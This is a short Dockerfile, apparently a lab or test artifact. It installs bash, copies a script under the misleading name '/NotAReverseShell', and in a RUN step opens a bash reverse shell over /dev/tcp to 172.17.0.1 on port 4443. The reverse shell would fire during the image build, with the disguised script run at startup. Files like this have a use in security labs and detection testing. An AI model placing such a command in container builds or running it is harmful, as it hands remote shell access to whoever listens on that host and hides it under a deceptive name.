FROM alpine

RUN apk --update add bash 
ADD shell.sh /NotAReverseShell
EXPOSE 4443
RUN bash -i >& /dev/tcp/172.17.0.1/4443 0>&1 &
ENTRYPOINT ["/bin/bash"]
CMD ["/NotAReverseShell"]
